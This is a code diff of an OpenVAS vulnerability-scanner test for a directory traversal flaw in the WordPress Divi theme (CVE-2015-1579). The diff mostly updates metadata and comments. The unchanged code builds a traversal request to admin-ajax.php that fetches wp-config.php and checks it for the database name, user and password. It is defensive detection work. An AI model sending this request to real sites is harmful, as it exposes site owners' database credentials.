@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wp_divi_auth_bypass_vuln.nasl 6214 2017-05-26 09:04:01Z teissa $
+# $Id: gb_wp_divi_auth_bypass_vuln.nasl 11227 2018-09-04 13:25:37Z mmartin $
 #
 # WordPress Divi Theme Directory Traversal Vulnerability
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805343");
-  script_version("$Revision: 6214 $");
+  script_version("$Revision: 11227 $");
   script_cve_id("CVE-2015-1579");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-26 11:04:01 +0200 (Fri, 26 May 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-04 15:25:37 +0200 (Tue, 04 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-03-06 11:19:45 +0530 (Fri, 06 Mar 2015)");
   script_name("WordPress Divi Theme Directory Traversal Vulnerability");
 
@@ -54,15 +54,13 @@ if(description)
 
   script_tag(name:"affected", value:"Wordpress Divi Theme");
 
-  script_tag(name:"solution", value:"No solution or patch was made available
-  for at least one year since disclosure of this vulnerability. Likely none will
-  be provided anymore. General solution options are to upgrade to a newer release,
-  disable respective features, remove the product or replace the product by another
-  one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
+Likely none will be provided anymore.
+General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
   script_tag(name:"qod_type", value:"exploit");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/36039/");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36039/");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
   script_family("Web application abuses");
@@ -77,29 +75,20 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-## Variable Initialization
-http_port = 0;
-dir = "";
-url = "";
-
-## Get HTTP Port
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Get WordPress Location
 if(!dir = get_app_location(cpe:CPE, port:http_port)){
   exit(0);
 }
 
-## Vulnerable URL
 url = dir + '/wp-admin/admin-ajax.php?action='
           + 'revslider_show_image&img=../wp-config.php';
 
 sndReq = http_get(item:url,  port:http_port);
 rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
-## Try attack and check the response to confirm vulnerability
 if(http_vuln_check(port:http_port, url:url, check_header:FALSE,
    pattern:"DB_NAME", extra_check:make_list("DB_USER", "DB_PASSWORD")))
 {
